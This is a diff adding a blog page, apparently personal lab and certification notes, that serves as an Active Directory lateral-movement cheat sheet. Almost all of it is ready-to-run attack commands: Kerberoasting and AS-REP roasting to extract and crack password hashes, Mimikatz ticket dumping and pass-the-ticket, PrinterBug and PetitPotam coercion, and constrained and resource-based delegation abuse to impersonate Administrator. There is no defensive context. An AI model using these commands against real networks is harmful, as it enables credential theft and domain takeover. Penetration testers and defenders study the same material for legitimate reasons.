@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta https-equiv="content-type" content=
+  "text/html; charset=UTF-8">
+  <title>Active Directory Lateral Movement</title>
+  <meta name="viewport" content=
+  "initial-scale=1.0, maximum-scale=1.0, width=device-width">
+  <meta name="description" content=
+  "My notes from various labs and certs.">
+  <meta name="robots" content="index, follow">
+  <meta property="og:url" content="https://eli2k.com/">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Home">
+  <meta property="og:description" content="Home">
+  <meta property="og:image" content=
+  "https://eli2k.com/resources/images/homepage.png">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/style.css">
+  <link rel="icon" href=
+  "https://eli2k.com/resources/images/bluscrn.gif" type=
+  "image/gif">
+  <link rel="stylesheet" href=
+  "https://eli2k.com/resources/css/prism.css">
+  <link rel="stylesheet" href=
+  "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+  <input type="checkbox" class="theme-switch" id="theme-switch">
+  <div id="page">
+    <label for="theme-switch" class="switch-label"></label>
+    <script src="https://eli2k.com/resources/js/prism.js"></script>
+    
+    <script>
+
+    NekoType = "robot"
+    </script>
+    <h1 id="nl">
+    <script src=
+    "https://webneko.net/n20171213.js"></script><a href="https://webneko.net">Neko</a></h1>
+    <div id="container">
+      <div id="header">
+        <div class="text-container">
+          <span>E</span> <span>L</span> <span>I</span> <span>2</span> <span>K</span>
+        </div>
+      </div>
+      <div id="left-sidebar"></div>
+      <div class="divider"></div>
+      <div class="pageContent">
+        <div class="nav border">
+          <ul>
+            <a href="https://eli2k.com/" title="The homepage. acts as an index for all of the indexes.">
+              <li>Home
+              </li>
+            </a>
+            <a href="https://github.com/Eli2k765" title="My Github.">
+              <li>Github
+              </li>
+            </a>
+          </ul>
+        </div>
+        <div class="page-content blog border"><button id="toggle-all-btn">Show All</button>
+          <div class="box">
+            <div class="inner-box-content">
+              <div class="article-wrapper">
+                <h1>Active Directory Lateral Movement</h1>
+                <p class="alert">Cheat Sheet</p><strong>Last
+                updated: March 5th, 2023</strong>
+                <article>
+                  <div id="contain">
+                    <h2>Kerberoasting</h2>
+                    <h3>Found SPN</h3>
+                    <h4>Extract Hash</h4>
+                    <pre><code class=
+                    "language-powershell">#Specific Account
+Rubeus.exe kerberoast /user:{USER} /rc4opsec /outfile:hashes.txt
+Request-SPNTicket -SPN "{SPN}" -OutputFormat {Hashcat:John} | % {$_.Hash} &gt; hashes.txt
+impacket-GetUserSPNs -request -dc-ip {Full.domain}/{USER}:{PASS} -request-user {USER} -outputfile hashes.txt
+#All Accounts
+Invoke-Kerberoast -OuputFormat {Hashcat:John} | % {$_.Hash} &gt; hashes.txt
+Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat {hashcat:john} &gt; hashes.txt
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+crackmapexec ldap DC-IP -u {USER} -P {PASS} --kerberoasting hashes.txt
+impacket-GetUserSPNs -request -dc-ip {IP} {Full.domain}/{USER}:{PASS} -outputfile hashes.txt
+kerberos::list /export #from mem to disk</code></pre>
+                    <h4>Cracking Hashes</h4>
+                    <pre><code class=
+                    "language-powershell">john --wordlist=wordlist.txt hashes.txt
+hashcat -m 13100 --force -a 0 hashes.txt {wordlist.txt}</code></pre>
+                    <h3>Set SPN</h3>
+                    <pre><code class=
+                    "language-powershell">Set-DomainObject -Identify {USER} -Set @{serviceprincipalname='Service/Name'}</code></pre>
+                    <h2>Kerberos Delegation</h2>
+                    <h3>Unconstrained Delegation</h3>
+                    <h4>Basic</h4>
+                    <pre><code class=
+                    "language-powershell">#Dumping Tickets
+Invoke-Mimikatz -Command '''sekurlsa::tickets /export'''
+
+#Using Tickets
+Invoke-Mimikatz -Command '''kerberos::ptt {C:\Path\To\Ticket}'''</code></pre>
+                    <h4>Using Exploits</h4>
+                    <pre><code class=
+                    "language-powershell">#Ticket Monitoring
+Rubeus.exe monitor /interval:5 /nowrap
+
+#Running Exploits
+.\MS-RPN.exe \\dc.domain.com \\VulnMachine.domain.com #PrinterBug
+.\PetitPotam.exe {VulnPC} {DC}
+
+#Using Tickets
+Rubeus.exe ptt /ticket:{base64 Ticket}</code></pre>
+                    <h3>Constrained Delegation</h3>
+                    <pre><code class=
+                    "language-powershell">#mimi + kekeo
+kekeo# tgt::ask /user:{USER} /domain:{full.domain.com} /rc4:{HASH} #request tgt
+kekeo# tgs::s4u /tgt:{TGT-File}.kiribi /user:Administrator@Domain.com /service:{CIFS}/{PC.Domain.com} #request tgs
+Invoke-Mimikatz -Command '''kerberos::ptt {TICKET}.kiribi'''
+
+#rubeus
+Rubeus.exe s4u /user:websvc /aes256:{USER AES} /impersonateuser:Administrator /msdsspn:service/pc.domain.com /ptt</code></pre>
+                    <h3>Resource Based</h3>
+                    <pre><code class=
+                    "language-powershell">Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount {PWNedHost$}
+Rubeus.exe s4u /user:{PWNED}$ /aes256:{PC$ aes256} /msdsspn:{SVC}/{SVCMACHINE} /impersonateuser:administrator /ptt</code></pre>
+                    <h2>AREPRoasting</h2>
+                    <h3>Dumping Hashes</h3>
+                    <pre><code class=
+                    "language-powershell">#specific account
+Get-ASREPHash -UserName {user} -Verbose
+
+#all acounts
+Rubeus.exe asreproast /format:{hashcat:john} /outfile:hashes
+crackmapexec ldap DC-IP -u {user} -p {pass} --asreproast hashes.txt
+##getnpusers
+###with creds
+impacket-getnpusers -request -dc-ip {ip} {full.domain}/{user}:{password} -format {hashcat:john} -outputfile hashes.txt
+###with users
+impacket-getnpusers -request -dc-ip {ip} --usersfile -users.txt {full.domain}/ -format {hashcat:john} -outputfile hashes.txt</code></pre>
+                    <h3>Cracking Hashes</h3>
+                    <pre><code class=
+                    "language-powershell">john --wordlist={wlpath} hashes.txt
+hashcat -m 18200 --force -a 0 hashes.txt {wlpath}</code></pre>
+                  </div>
+                </article>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="footer border"></div>
+      </div>
+    </div>
+    <script src=
+    "https://eli2k.com/resources/js/themeSwitch.js"></script>
+    <script src=
+    "https://eli2k.com/resources/js/collapseList.js"></script>
+    
+  </div>
+</body>
+</html>
